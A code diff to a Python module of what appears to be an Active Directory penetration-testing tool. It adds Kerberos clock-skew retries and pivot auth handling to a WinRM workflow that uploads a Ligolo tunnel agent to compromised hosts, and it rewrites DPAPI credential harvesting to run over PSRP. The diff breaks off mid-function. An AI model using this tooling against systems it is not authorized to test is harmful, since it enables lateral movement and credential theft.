@@ -10,8 +10,6 @@ from __future__ import annotations
 from dataclasses import dataclass
 import json
 import os
-import re
-import base64
 import time
 import ipaddress
 from datetime import datetime, timezone
@@ -30,7 +28,6 @@ from adscan_internal import (
     print_operation_header,
     print_success,
     print_warning,
-    print_warning_verbose,
     telemetry,
 )
 from adscan_internal.rich_output import mark_sensitive
@@ -38,18 +35,25 @@ from adscan_internal.cli.scan_outcome_flow import (
     render_no_extracted_findings_preview,
 )
 from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
+from adscan_internal.services.pivot_auth_context_service import (
+    build_persisted_pivot_auth_context,
+    resolve_pivot_auth_secret,
+)
 from adscan_internal.services.post_pivot_followup_service import (
     PivotExecutionContext,
     maybe_offer_post_pivot_owned_followup,
+    maybe_offer_post_pivot_trust_followup_from_targets,
     refresh_network_inventory_after_pivot,
     render_post_pivot_reachability_delta,
 )
 from adscan_internal.services.pivot_opportunity_service import (
     ensure_host_bound_workflow_target_viable,
 )
+from adscan_internal.services.pivot_reachability_candidate_service import (
+    collect_pivot_reachability_candidates,
+)
 from adscan_internal.services.smb_sensitive_file_policy import (
     SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
-    SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
     SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
     get_production_sensitive_scan_phase_sequence,
     get_sensitive_file_extensions,
@@ -73,6 +77,10 @@ from adscan_internal.services.winrm_file_mapping_service import (
 from adscan_internal.services.winrm_psrp_service import (
     WinRMPSRPError,
     WinRMPSRPService,
+    is_clock_skew_error,
+)
+from adscan_internal.services.winrm_access_probe_service import (
+    resolve_winrm_probe_targets,
 )
 from adscan_internal.services.windows_sensitive_scan_policy_service import (
     WindowsSensitiveScanPolicyService,
@@ -89,7 +97,6 @@ from adscan_internal.services.windows_artifact_acquisition_service import (
     format_fetch_path_preview,
     summarize_fetch_skip_reasons,
 )
-from adscan_internal.text_utils import strip_ansi_codes
 
 _WINRM_MAPPING_CACHE_MAX_AGE_CTF = timedelta(minutes=30)
 _WINRM_MAPPING_MODE_AUTO = "auto"
@@ -100,6 +107,7 @@ _VALID_WINRM_MAPPING_MODES = {
     _WINRM_MAPPING_MODE_REFRESH,
     _WINRM_MAPPING_MODE_REUSE,
 }
+
 
 
 @dataclass(slots=True)
@@ -137,7 +145,12 @@ def _apply_winrm_phase_candidate_exclusions(
 
 
 def _build_winrm_psrp_service(
-    *, domain: str, host: str, username: str, password: str
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    kerberos_spn_host: str | None = None,
 ) -> WinRMPSRPService:
     """Create a reusable PSRP service for a WinRM target."""
     return WinRMPSRPService(
@@ -146,11 +159,17 @@ def _build_winrm_psrp_service(
         username=username,
         password=password,
         auth_mode="auto",
+        kerberos_spn_host=kerberos_spn_host,
     )
 
 
 def build_winrm_reusable_backend(
-    *, domain: str, host: str, username: str, password: str
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    kerberos_spn_host: str | None = None,
 ):
     """Build the default reusable WinRM backend for CLI/manual flows."""
     return build_winrm_backend(
@@ -159,6 +178,7 @@ def build_winrm_reusable_backend(
         username=username,
         password=password,
         auth_mode="auto",
+        kerberos_spn_host=kerberos_spn_host,
     )
 
 
@@ -179,6 +199,7 @@ def _execute_powershell_via_psrp(
     script: str,
     operation_name: str | None = None,
     require_logon_bypass: bool = False,
+    kerberos_spn_host: str | None = None,
 ) -> str:
     """Execute PowerShell over the reusable WinRM backend and return stdout."""
     service = build_winrm_reusable_backend(
@@ -186,6 +207,7 @@ def _execute_powershell_via_psrp(
         host=host,
         username=username,
         password=password,
+        kerberos_spn_host=kerberos_spn_host,
     )
     result = service.execute_powershell(
         script,
@@ -197,6 +219,73 @@ def _execute_powershell_via_psrp(
     if result.stderr:
         print_info_debug("WinRM PSRP execution returned non-empty stderr output.")
     return result.stdout
+
+
+def _execute_powershell_with_clock_retry(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    script: str,
+    operation_name: str | None = None,
+    require_logon_bypass: bool = False,
+    kerberos_spn_host: str | None = None,
+) -> str:
+    """Execute PowerShell over PSRP, syncing the clock and retrying once on Kerberos time errors.
+
+    Covers both KRB_AP_ERR_SKEW and KRB5KRB_AP_ERR_TKT_NYV so that Kerberos-only
+    environments (NTLM disabled) survive clock drift between sessions without
+    requiring manual intervention.
+    """
+    try:
+        return _execute_powershell_via_psrp(
+            domain=domain,
+            host=host,
+            username=username,
+            password=password,
+            script=script,
+            operation_name=operation_name,
+            require_logon_bypass=require_logon_bypass,
+            kerberos_spn_host=kerberos_spn_host,
+        )
+    except (WinRMPSRPError, Exception) as exc:
+        if not is_clock_skew_error(exc):
+            raise
+
+        sync_fn = getattr(shell, "do_sync_clock_with_pdc", None)
+        if not callable(sync_fn):
+            print_info_debug(
+                f"[winrm] clock-skew detected but do_sync_clock_with_pdc unavailable: {exc}"
+            )
+            raise
+
+        from adscan_internal import print_warning
+
+        marked_domain = mark_sensitive(domain, "domain")
+        print_warning(
+            f"Kerberos time error connecting to {mark_sensitive(host, 'hostname')} "
+            f"({exc}). Syncing clock with {marked_domain} PDC and retrying..."
+        )
+        synced = bool(sync_fn(domain, verbose=True))
+        if not synced:
+            print_warning(
+                f"Clock sync with {marked_domain} PDC failed; retrying WinRM anyway."
+            )
+        print_info_debug(
+            f"[winrm] clock-sync result={synced!r}; retrying {operation_name or 'psrp'} on {mark_sensitive(host, 'hostname')}"
+        )
+        return _execute_powershell_via_psrp(
+            domain=domain,
+            host=host,
+            username=username,
+            password=password,
+            script=script,
+            operation_name=operation_name,
+            require_logon_bypass=require_logon_bypass,
+            kerberos_spn_host=kerberos_spn_host,
+        )
 
 
 def _parse_psrp_path_list(stdout: str) -> list[str]:
@@ -230,6 +319,33 @@ def _load_workspace_network_reachability_report(
     except (OSError, json.JSONDecodeError):
         return None
     return payload if isinstance(payload, dict) else None
+
+
+def _resolve_winrm_kerberos_spn_host(
+    shell: Any, *, domain: str, host: str
+) -> str | None:
+    """Return the hostname that Kerberos should use for WinRM's HTTP SPN."""
+    try:
+        domains_data = getattr(shell, "domains_data", {})
+        domain_data = (
+            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
+        )
+        targets = resolve_winrm_probe_targets(
+            targets=[host],
+            domain=domain,
+            workspace_dir=str(getattr(shell, "current_workspace_dir", "") or ""),
+            domains_dir=str(getattr(shell, "domains_dir", "domains") or "domains"),
+            domain_data=domain_data if isinstance(domain_data, dict) else {},
+        )
+    except Exception as exc:  # noqa: BLE001
+        print_info_debug(
+            "Unable to resolve WinRM Kerberos SPN host for pivot workflow: "
+            f"host={mark_sensitive(host, 'hostname')} error={mark_sensitive(str(exc), 'detail')}"
+        )
+        return None
+    if not targets:
+        return None
+    return str(targets[0].kerberos_spn_host or "").strip() or None
 
 
 def _build_winrm_network_inventory_script() -> str:
@@ -351,7 +467,12 @@ if ($rawArchitecture) {
 
 
 def detect_winrm_windows_architecture(
-    *, domain: str, host: str, username: str, password: str
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    kerberos_spn_host: str | None = None,
 ) -> str | None:
     """Detect the remote Windows architecture over WinRM without CIM dependencies."""
     output = _execute_powershell_via_psrp(
@@ -359,6 +480,7 @@ def detect_winrm_windows_architecture(
         host=host,
         username=username,
         password=password,
+        kerberos_spn_host=kerberos_spn_host,
         script=_build_winrm_windows_architecture_script(),
         operation_name="windows_architecture_detect",
     )
@@ -384,104 +506,19 @@ def _normalize_ipv4_network(address: str, prefix_length: int | None) -> str | No
     return str(network)
 
 
-def _collect_trusted_domain_pivot_candidates(
-    shell: Any,
-    *,
-    source_domain: str,
-    ports_scanned: list[int],
-) -> list[dict[str, Any]]:
-    """Return unresolved trusted-domain PDC targets for pivot probing."""
-    raw_connectivity = getattr(shell, "domain_connectivity", {})
-    if not isinstance(raw_connectivity, dict):
-        return []
-
-    candidates: list[dict[str, Any]] = []
-    for trusted_domain, entry in raw_connectivity.items():
-        if not isinstance(entry, dict):
-            continue
-        summary = entry.get("summary", {})
-        if not isinstance(summary, dict):
-            continue
-        if str(summary.get("source_domain") or "").strip().lower() != source_domain.lower():
-            continue
-        if bool(summary.get("reachable")):
-            continue
-        trusted_state = (
-            getattr(shell, "domains_data", {}).get(trusted_domain, {})
-            if isinstance(getattr(shell, "domains_data", {}), dict)
-            else {}
-        )
-        if isinstance(trusted_state, dict) and bool(trusted_state.get("phase1_complete")):
-            continue
-        pdc_ip = str(summary.get("pdc_ip") or "").strip()
-        if not pdc_ip:
-            continue
-        candidates.append(
-            {
-                "ip": pdc_ip,
-                "status": str(summary.get("status") or "").strip()
-                or "no_response_from_current_vantage",
-                "classification": "trusted_domain_pdc_unreachable",
-                "hostname_candidates": [trusted_domain],
-                "ports": list(ports_scanned),
-                "origin": "trusted_domain_connectivity",
-                "target_domain": trusted_domain,
-            }
-        )
-    return candidates
-
-
 def _collect_winrm_pivot_candidates(
     shell: Any,
     *,
     domain: str,
     payload: dict[str, Any],
 ) -> tuple[list[dict[str, Any]], dict[str, int], list[int]]:
-    """Collect host-level and inter-domain pivot candidates for one domain."""
-    ip_entries = payload.get("ips", []) if isinstance(payload.get("ips"), list) else []
-    ports_scanned: list[int] = []
-    context = payload.get("context", {})
-    if isinstance(context, dict):
-        ports_scanned = [
-            int(port) for port in context.get("ports_scanned", []) if str(port).isdigit()
-        ]
-
-    candidates: list[dict[str, Any]] = []
-    host_hidden_count = 0
-    for entry in ip_entries:
-        if not isinstance(entry, dict):
-            continue
-        if str(entry.get("status") or "").strip() != "no_response_from_current_vantage":
-            continue
-        ip_text = str(entry.get("ip") or "").strip()
-        if not ip_text:
-            continue
-        host_hidden_count += 1
-        candidate = dict(entry)
-        candidate["ports"] = list(ports_scanned)
-        candidate["origin"] = "current_vantage"
-        candidate["target_domain"] = None
-        candidates.append(candidate)
-
-    trusted_domain_candidates = _collect_trusted_domain_pivot_candidates(
-        shell,
+    """Collect shared pivot candidates using workspace state exposed by the CLI shell."""
+    return collect_pivot_reachability_candidates(
         source_domain=domain,
-        ports_scanned=ports_scanned,
+        payload=payload,
+        domain_connectivity=getattr(shell, "domain_connectivity", {}) or {},
+        domains_data=getattr(shell, "domains_data", {}) or {},
     )
-    existing_ips = {
-        str(entry.get("ip") or "").strip() for entry in candidates if isinstance(entry, dict)
-    }
-    for candidate in trusted_domain_candidates:
-        if str(candidate.get("ip") or "").strip() in existing_ips:
-            continue
-        candidates.append(candidate)
-
-    counts = {
-        "host_hidden_count": host_hidden_count,
-        "trusted_domain_count": len(trusted_domain_candidates),
-        "total_count": len(candidates),
-    }
-    return candidates, counts, ports_scanned
 
 
 def _select_winrm_pivot_targets(
@@ -497,11 +534,17 @@ def _select_winrm_pivot_targets(
     ports_scanned: list[int] = []
     if entries is None:
         resolved_payload = payload if isinstance(payload, dict) else {}
-        entries = resolved_payload.get("ips", []) if isinstance(resolved_payload.get("ips"), list) else []
+        entries = (
+            resolved_payload.get("ips", [])
+            if isinstance(resolved_payload.get("ips"), list)
+            else []
+        )
         context = resolved_payload.get("context", {})
         if isinstance(context, dict):
             ports_scanned = [
-                int(port) for port in context.get("ports_scanned", []) if str(port).isdigit()
+                int(port)
+                for port in context.get("ports_scanned", [])
+                if str(port).isdigit()
             ]
     route_networks: list[ipaddress.IPv4Network] = []
     for route in remote_routes:
@@ -520,7 +563,9 @@ def _select_winrm_pivot_targets(
     for interface in remote_interfaces:
         network_text = _normalize_ipv4_network(
             str(interface.get("IPAddress") or "").strip(),
-            int(interface.get("PrefixLength")) if str(interface.get("PrefixLength") or "").strip().isdigit() else None,
+            int(interface.get("PrefixLength"))
+            if str(interface.get("PrefixLength") or "").strip().isdigit()
+            else None,
         )
         if not network_text:
             continue
@@ -579,9 +624,7 @@ def _select_winrm_pivot_targets(
                 ],
                 selection_reason=selection_reason,
                 origin=str(entry.get("origin") or "current_vantage").strip(),
-                target_domain=(
-                    str(entry.get("target_domain") or "").strip() or None
-                ),
+                target_domain=(str(entry.get("target_domain") or "").strip() or None),
             )
         )
         if len(selected) >= max_targets:
@@ -675,7 +718,9 @@ def _persist_winrm_pivot_reachability_report(
     return report_path
 
 
-def _summarize_winrm_pivot_inventory(entries: list[dict[str, Any]], *, route_mode: bool = False) -> str:
+def _summarize_winrm_pivot_inventory(
+    entries: list[dict[str, Any]], *, route_mode: bool = False
+) -> str:
     """Return a short debug summary for WinRM pivot inventory entries."""
     preview: list[str] = []
     for entry in entries[:5]:
@@ -704,7 +749,9 @@ def check_pivot_reachability_via_winrm(
     offer_post_pivot_owned_followup: bool = True,
 ) -> None:
     """Check whether a compromised WinRM host can reach IPs hidden from the original vantage."""
-    reachability_payload = _load_workspace_network_reachability_report(shell, domain=domain)
+    reachability_payload = _load_workspace_network_reachability_report(
+        shell, domain=domain
+    )
     if not reachability_payload:
         print_info_debug(
             "Skipping WinRM pivot reachability check: no current-vantage reachability report is available."
@@ -723,9 +770,29 @@ def check_pivot_reachability_via_winrm(
     )
     if candidate_counts["total_count"] == 0:
         print_info_debug(
-            "Skipping WinRM pivot reachability check: no host-level hidden targets or inter-domain trust targets exist."
+            "Skipping WinRM pivot reachability check: no host-level hidden targets, "
+            "service-hidden targets, or inter-domain trust targets exist."
         )
         return
+    effective_password = (
+        resolve_pivot_auth_secret(
+            shell,
+            domain=domain,
+            username=username,
+            source_service="winrm",
+            fallback_secret=password,
+        )
+        or password
+    )
+    kerberos_spn_host = _resolve_winrm_kerberos_spn_host(
+        shell, domain=domain, host=host
+    )
+    print_info_debug(
+        "WinRM pivot auth context: "
+        f"host={mark_sensitive(host, 'hostname')} "
+        f"auth={'kerberos_ccache' if str(effective_password).lower().endswith('.ccache') else 'workspace_credential'} "
+        f"spn_host={mark_sensitive(kerberos_spn_host or '-', 'hostname')}"
+    )
 
     try:
         print_operation_header(
@@ -735,37 +802,50 @@ def check_pivot_reachability_via_winrm(
                 "Pivot Host": host,
                 "Username": username,
                 "Host Hidden IPs": str(candidate_counts["host_hidden_count"]),
+                "Service Hidden IPs": str(candidate_counts["service_hidden_count"]),
                 "Trusted-Domain Targets": str(candidate_counts["trusted_domain_count"]),
                 "Protocol": "WinRM PSRP",
             },
             icon="🧭",
         )
         print_info(
-            "Assessing whether this WinRM host can reach hidden current-vantage targets "
-            "and unresolved trusted-domain controllers."
+            "Assessing whether this WinRM host can reach hidden hosts, service-hidden "
+            "targets, and unresolved trusted-domain controllers."
         )
-        inventory_stdout = _execute_powershell_via_psrp(
+        inventory_stdout = _execute_powershell_with_clock_retry(
+            shell,
             domain=domain,
             host=host,
             username=username,
-            password=password,
+            password=effective_password,
+            kerberos_spn_host=kerberos_spn_host,
             script=_build_winrm_network_inventory_script(),
             operation_name="pivot_network_inventory",
         )
         inventory_payload = json.loads(inventory_stdout or "{}")
         if not isinstance(inventory_payload, dict):
-            print_warning("WinRM network inventory returned an unexpected payload; skipping pivot reachability check.")
+            print_warning(
+                "WinRM network inventory returned an unexpected payload; skipping pivot reachability check."
+            )
             return
         remote_interfaces = inventory_payload.get("interfaces", [])
         remote_routes = inventory_payload.get("routes", [])
-        interface_source = str(inventory_payload.get("interface_source") or "").strip() or "none"
-        route_source = str(inventory_payload.get("route_source") or "").strip() or "none"
+        interface_source = (
+            str(inventory_payload.get("interface_source") or "").strip() or "none"
+        )
+        route_source = (
+            str(inventory_payload.get("route_source") or "").strip() or "none"
+        )
         if not isinstance(remote_interfaces, list):
             remote_interfaces = []
         if not isinstance(remote_routes, list):
             remote_routes = []
-        normalized_interfaces = [entry for entry in remote_interfaces if isinstance(entry, dict)]
-        normalized_routes = [entry for entry in remote_routes if isinstance(entry, dict)]
+        normalized_interfaces = [
+            entry for entry in remote_interfaces if isinstance(entry, dict)
+        ]
+        normalized_routes = [
+            entry for entry in remote_routes if isinstance(entry, dict)
+        ]
         print_info_debug(
             "WinRM pivot inventory summary: "
             f"interface_source={mark_sensitive(interface_source, 'text')} "
@@ -787,7 +867,9 @@ def check_pivot_reachability_via_winrm(
                 for entry in candidate_entries
                 if isinstance(entry, dict) and str(entry.get("ip") or "").strip()
             ]
-            debug_candidate_targets = ", ".join(candidate_preview) if candidate_preview else "none"
+            debug_candidate_targets = (
+                ", ".join(candidate_preview) if candidate_preview else "none"
+            )
             report_path = _persist_winrm_pivot_reachability_report(
                 shell,
                 domain=domain,
@@ -797,13 +879,24 @@ def check_pivot_reachability_via_winrm(
                     "domain": domain,
                     "pivot_host": host,
                     "pivot_username": username,
+                    "pivot_auth": build_persisted_pivot_auth_context(
+                        source_service="winrm",
+                        username=username,
+                        secret=effective_password,
+                        kerberos_spn_host=kerberos_spn_host,
+                    ),
                     "interfaces": normalized_interfaces,
                     "routes": normalized_routes,
                     "interface_source": interface_source,
                     "route_source": route_source,
                     "summary": {
                         "hidden_target_count": candidate_counts["host_hidden_count"],
-                        "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
+                        "service_hidden_target_count": candidate_counts[
+                            "service_hidden_count"
+                        ],
+                        "trusted_domain_target_count": candidate_counts[
+                            "trusted_domain_count"
+                        ],
                         "candidate_count": 0,
                         "confirmed_reachable_count": 0,
                         "same_subnet_no_response_count": 0,
@@ -813,7 +906,8 @@ def check_pivot_reachability_via_winrm(
                     "hidden_targets": [
                         str(entry.get("ip") or "").strip()
                         for entry in candidate_entries
-                        if isinstance(entry, dict) and str(entry.get("ip") or "").strip()
+                        if isinstance(entry, dict)
+                        and str(entry.get("ip") or "").strip()
                     ],
                     "candidate_origins": candidate_counts,
                     "targets": [],
@@ -832,14 +926,19 @@ def check_pivot_reachability_via_winrm(
             return
 
         subnet_candidates = sum(
-            1 for target in selected_targets if str(target.selection_reason).startswith("same_subnet:")
+            1
+            for target in selected_targets
+            if str(target.selection_reason).startswith("same_subnet:")
         )
         routed_candidates = len(selected_targets) - subnet_candidates
         trusted_domain_candidates = sum(
-            1 for target in selected_targets if target.origin == "trusted_domain_connectivity"
+            1
+            for target in selected_targets
+            if target.origin == "trusted_domain_connectivity"
         )
         debug_selected_targets = ", ".join(
-            f"{target.ip}:{target.origin}:{target.selection_reason}" for target in selected_targets
+            f"{target.ip}:{target.origin}:{target.selection_reason}"
+            for target in selected_targets
         )
         print_info_debug(
             "WinRM pivot candidate selection: "
@@ -850,6 +949,7 @@ def check_pivot_reachability_via_winrm(
         print_info(
             f"This host may be a useful pivot for {len(selected_targets)} target(s) "
             f"({candidate_counts['host_hidden_count']} hidden current-vantage, "
+            f"{candidate_counts['service_hidden_count']} service-hidden, "
             f"{candidate_counts['trusted_domain_count']} trusted-domain, "
             f"{subnet_candidates} same-subnet, {routed_candidates} routed)."
         )
@@ -865,18 +965,24 @@ def check_pivot_reachability_via_winrm(
             print_info("Skipping WinRM pivot reachability probing by user choice.")
             return
 
-        probe_stdout = _execute_powershell_via_psrp(
+        probe_stdout = _execute_powershell_with_clock_retry(
+            shell,
             domain=domain,
             host=host,
             username=username,
-            password=password,
+            password=effective_password,
+            kerberos_spn_host=kerberos_spn_host,
             script=_build_winrm_pivot_probe_script(selected_targets),
             operation_name="pivot_tcp_probe",
         )
         probe_payload = json.loads(probe_stdout or "{}")
-        targets_payload = probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
+        targets_payload = (
+            probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
+        )
         if not isinstance(targets_payload, list):
-            print_warning("WinRM pivot probe returned an unexpected payload; skipping report rendering.")
+            print_warning(
+                "WinRM pivot probe returned an unexpected payload; skipping report rendering."
+            )
             return
 
         confirmed_reachable: list[dict[str, Any]] = []
@@ -886,7 +992,9 @@ def check_pivot_reachability_via_winrm(
             if not isinstance(entry, dict):
                 continue
             reachable_ports = [
-                int(port) for port in entry.get("reachable_ports", []) if str(port).isdigit()
+                int(port)
+                for port in entry.get("reachable_ports", [])
+                if str(port).isdigit()
             ]
             reason = str(entry.get("selection_reason") or "").strip()
             if reachable_ports:
@@ -901,6 +1009,12 @@ def check_pivot_reachability_via_winrm(
             "domain": domain,
             "pivot_host": host,
             "pivot_username": username,
+            "pivot_auth": build_persisted_pivot_auth_context(
+                source_service="winrm",
+                username=username,
+                secret=effective_password,
+                kerberos_spn_host=kerberos_spn_host,
+            ),
             "interfaces": remote_interfaces,
             "routes": remote_routes,
             "interface_source": interface_source,
@@ -908,6 +1022,7 @@ def check_pivot_reachability_via_winrm(
             "summary": {
                 "candidate_count": len(selected_targets),
                 "confirmed_reachable_count": len(confirmed_reachable),
+                "service_hidden_target_count": candidate_counts["service_hidden_count"],
                 "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
                 "same_subnet_no_response_count": len(same_subnet_no_response),
                 "no_connectivity_confirmed_count": len(no_connectivity_confirmed),
@@ -940,8 +1055,13 @@ def check_pivot_reachability_via_winrm(
                             for item in entry.get("hostname_candidates", [])
                         )
                         or "-",
-                        ", ".join(str(port) for port in entry.get("reachable_ports", [])) or "-",
-                        mark_sensitive(str(entry.get("selection_reason") or ""), "text"),
+                        ", ".join(
+                            str(port) for port in entry.get("reachable_ports", [])
+                        )
+                        or "-",
+                        mark_sensitive(
+                            str(entry.get("selection_reason") or ""), "text"
+                        ),
                     )
                 shell.console.print(table)
         if same_subnet_no_response:
@@ -958,17 +1078,68 @@ def check_pivot_reachability_via_winrm(
             )
         if confirmed_reachable:
             upload_helper = getattr(shell, "winrm_upload", None) or winrm_upload
+
+            def _detect_architecture_with_auth_context(**kwargs: Any) -> str | None:
+                return detect_winrm_windows_architecture(
+                    domain=str(kwargs.get("domain") or domain),
+                    host=str(kwargs.get("host") or host),
+                    username=str(kwargs.get("username") or username),
+                    password=str(kwargs.get("password") or effective_password),
+                    kerberos_spn_host=str(
+                        kwargs.get("kerberos_spn_host") or kerberos_spn_host or ""
+                    )
+                    or None,
+                )
+
+            def _upload_agent_with_auth_context(**kwargs: Any) -> bool:
+                upload_kwargs = {
+                    "domain": str(kwargs.get("domain") or domain),
+                    "host": str(kwargs.get("host") or host),
+                    "username": str(kwargs.get("username") or username),
+                    "password": str(kwargs.get("password") or effective_password),
+                    "local_path": str(kwargs.get("local_path") or ""),
+                    "remote_path": str(kwargs.get("remote_path") or ""),
+                }
+                try:
+                    return upload_helper(
+                        **upload_kwargs,
+                        kerberos_spn_host=str(
+                            kwargs.get("kerberos_spn_host") or kerberos_spn_host or ""
+                        )
+                        or None,
+                    )
+                except TypeError:
+                    return upload_helper(**upload_kwargs)
+
+            def _execute_script_with_auth_context(**kwargs: Any) -> str:
+                return _execute_powershell_via_psrp(
+                    domain=str(kwargs.get("domain") or domain),
+                    host=str(kwargs.get("host") or host),
+                    username=str(kwargs.get("username") or username),
+                    password=str(kwargs.get("password") or effective_password),
+                    script=str(kwargs.get("script") or ""),
+                    operation_name=kwargs.get("operation_name"),
+                    require_logon_bypass=bool(
+                        kwargs.get("require_logon_bypass", False)
+                    ),
+                    kerberos_spn_host=str(
+                        kwargs.get("kerberos_spn_host") or kerberos_spn_host or ""
+                    )
+                    or None,
+                )
+
             tunnel_created = orchestrate_ligolo_pivot_tunnel(
                 shell,
                 domain=domain,
                 pivot_host=host,
                 username=username,
-                password=password,
+                password=effective_password,
                 confirmed_targets=confirmed_reachable,
-                detect_remote_architecture=detect_winrm_windows_architecture,
-                upload_agent=upload_helper,
-                execute_remote_script=_execute_powershell_via_psrp,
+                detect_remote_architecture=_detect_architecture_with_auth_context,
+                upload_agent=_upload_agent_with_auth_context,
+                execute_remote_script=_execute_script_with_auth_context,
                 remote_agent_os="windows",
+                pivot_kerberos_spn_host=kerberos_spn_host,
             )
             if tunnel_created:
                 pivot_context = PivotExecutionContext(
@@ -977,6 +1148,11 @@ def check_pivot_reachability_via_winrm(
                     pivot_method="ligolo_winrm_pivot",
                     pivot_tool="Ligolo",
                     source_service="winrm",
+                )
+                maybe_offer_post_pivot_trust_followup_from_targets(
+                    shell,
+                    context=pivot_context,
+                    confirmed_targets=confirmed_reachable,
                 )
                 refresh_result = refresh_network_inventory_after_pivot(
                     shell,
@@ -1038,6 +1214,7 @@ def ask_for_winrm_access(
             domain=domain,
             target_host=host,
             workflow_label="WinRM access workflow",
+            service="winrm",
         )
         is None
     ):
@@ -1066,10 +1243,15 @@ def ask_for_winrm_access(
         )
     else:
         answer = Confirm.ask(
-            f"Do you want to enumerate host {marked_host} via WinRM as user {marked_username}?"
+            f"Do you want to enumerate host {marked_host} via WinRM as user {marked_username}?",
+            default=True,
         )
     if answer:
-        if normalized_intent in {"pivot_search", "pivot_host_bound_resume", "pivot_relaunch"}:
+        if normalized_intent in {
+            "pivot_search",
+            "pivot_host_bound_resume",
+            "pivot_relaunch",
+        }:
             followup_steps = [
                 (
                     "pivot_reachability",
@@ -1079,7 +1261,8 @@ def ask_for_winrm_access(
                         host=host,
                         username=username,
                         password=password,
-                        offer_post_pivot_owned_followup=normalized_intent == "pivot_search",
+                        offer_post_pivot_owned_followup=normalized_intent
+                        == "pivot_search",
                     ),
                 ),
             ]
@@ -1134,6 +1317,14 @@ def ask_for_winrm_access(
                     ),
                 ),
             ]
+        from adscan_core.rich_output_collection import (
+            print_phase_recap,
+            print_phase_ribbon,
+        )
+
+        total_phases = len(followup_steps)
+        phases_run = 0
+        session_started = time.time()
         for action_label, action in followup_steps:
             if _should_skip_winrm_followup_for_ctf_pwned(
                 shell=shell,
@@ -1141,17 +1332,65 @@ def ask_for_winrm_access(
                 action_label=action_label,
             ):
                 return
+            phases_run += 1
+            print_phase_ribbon(
+                index=phases_run,
+                total=total_phases,
+                name=action_label,
+                status="live",
+            )
             action()
+        elapsed = time.time() - session_started
+        elapsed_label = (
+            f"{elapsed:.0f}s"
+            if elapsed < 60
+            else f"{int(elapsed // 60)}m{int(elapsed % 60):02d}s"
+        )
+        print_phase_recap(
+            title=f"WinRM session · {marked_host}",
+            phases_total=total_phases,
+            extra_metrics=((elapsed_label, "elapsed"),),
+        )
 
 
 def check_dpapi(
     shell: Any, *, domain: str, host: str, username: str, password: str
 ) -> None:
-    """Dump DPAPI-protected credentials on a host using NetExec over WinRM."""
-    from adscan_internal.cli.dumps import process_dpapi_output
+    """Dump DPAPI user-context credentials over WinRM/PSRP.
+
+    Runs natively over PSRP as the authenticated user — no admin or SMB share
+    access required. The PSRP session inherits the user's profile, so all the
+    masterkeys and credential blobs they own are reachable. Decryption happens
+    locally with the user's plaintext password.
+    """
+    from adscan_core.rich_output_collection import (
+        DpapiHaulEntry,
+        print_dpapi_haul_card,
+        print_dpapi_no_masterkeys_notice,
+        print_dpapi_no_vault_card,
+    )
+    from adscan_internal.cli.dumps import (
+        _load_dpapi_ad_users,
+        _persist_dpapi_result,
+        _run_native_async,
+    )
+    from adscan_internal.services.exploitation.dpapi_credential_processor import (
+        process_dpapi_credentials,
+    )
+    from adscan_internal.services.exploitation.dpapi_models import DpapiDumpResult
+    from adscan_internal.services.exploitation.dpapi_psrp_dump import (
+        WinRMDPAPIDumpService,
+        classify_credential_kind,
+    )
 
     try:
-        credential_type = "Hash" if shell.is_hash(password) else "Password"
+        if shell.is_hash(password):
+            print_warning(
+                "DPAPI user-context decryption requires the plaintext password; "
+                "hash-only authentication can establish WinRM but cannot derive "
+                "the DPAPI keys. Skipping."
+            )
+            return
 
         print_operation_header(
             "DPAPI Credential Check",
@@ -1159,51 +1398,156 @@ def check_dpapi(
                 "Domain": domain,
                 "Target Host": host,
                 "Username": username,
-                "Credential Type": credential_type,
-                "Protocol": "WinRM",
-                "Action": "DPAPI secret harvesting",
+                "Credential Type": "Password",
+                "Protocol": "WinRM (PSRP)",
+                "Action": "DPAPI user-context harvesting",
             },
             icon="🔐",
         )
 
-        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-        dpapi_command = (
-            f"{shell.netexec_path} winrm {host} {auth} "
-            f"--log domains/{domain}/winrm/dump_{host}_dpapi.txt --dpapi"
-        )
-        print_info_debug(f"Command: {dpapi_command}")
-        completed_process = shell._run_netexec(  # type: ignore[attr-defined]
-            dpapi_command,
-            domain=domain,
-            timeout=600,
-            operation_kind="winrm_dpapi_fallback",
-            service="winrm",
-            target_count=1,
-        )
-        output = completed_process.stdout or ""
-        errors_output = completed_process.stderr or ""
+        marked_host = mark_sensitive(host, "hostname")
+        marked_user = mark_sensitive(username, "user")
 
-        if completed_process.returncode == 0:
-            result = process_dpapi_output(
-                shell,
-                output=output,
-                domain=domain,
-                host=host,
-                auth_username=username,
-                source_protocol="winrm",
-                prompt_confirmation=True,
+        service = WinRMDPAPIDumpService(
+            domain=domain,
+            host=host,
+            username=username,
+            password=password,
+        )
+        dump_result = service.dump()
+
+        if not dump_result.success:
+            print_error(
+                "Error obtaining DPAPI credentials: "
+                f"{dump_result.error or 'transport failure'}"
             )
-            if int(result.get("count") or 0) == 0:
-                print_warning("No DPAPI credentials found in the output.")
-            else:
-                print_success("WinRM DPAPI processing completed")
             return
 
-        error_message = errors_output.strip() if errors_output else output.strip()
-        print_error(
-            "Error obtaining DPAPI credentials: "
-            f"{error_message if error_message else 'Details not available'}"
+        print_info_debug(
+            "[winrm-dpapi] dump summary: "
+            f"host={marked_host} user={marked_user} "
+            f"sid={mark_sensitive(dump_result.user_sid or '-', 'detail')} "
+            f"masterkeys_seen={dump_result.discovered_masterkey_count} "
+            f"masterkeys_decrypted={dump_result.decrypted_masterkey_count} "
+            f"credentials_seen={dump_result.discovered_credential_count} "
+            f"credentials_recovered={len(dump_result.normalized_credentials)}"
         )
+        for diagnostic in dump_result.diagnostics:
+            print_info_verbose(f"[winrm-dpapi] diagnostic: {diagnostic}")
+
+        if dump_result.discovered_masterkey_count == 0:
